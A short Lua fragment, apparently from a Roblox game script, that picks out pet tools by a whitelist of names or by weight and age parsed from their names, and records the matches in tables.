local pets, petNames = {}, {}

local PET_WHITELIST = {
    ["Silver Monkey"]=true,["Queen Bee"]=true,["Raccoon"]=true,
    ["Dragonfly"]=true,["Butterfly"]=true,["Red Fox"]=true,
    ["Chicken Zombie"]=true,["Disco Bee"]=true
}

local function isPet(tool)
    if not tool:IsA("Tool") then return false end

    local n   = tool.Name
    local typ = n:match("^(.-) %[") or ""

    local kgStr = (n:match("%[(.-) KG%]") or "")
    kgStr       = kgStr:gsub(",", "."):gsub("[^%d%.]", "")
    local kg    = tonumber(kgStr)

    local age   = tonumber(n:match("Age (%d+)") or "")

    return PET_WHITELIST[typ] or (kg and kg > 20) or (age and age > 50)
end

local function reg(t)
    if isPet(t) and not pets[t] then
        pets[t] = true
        petNames[#petNames + 1] = t.Name
    end
end


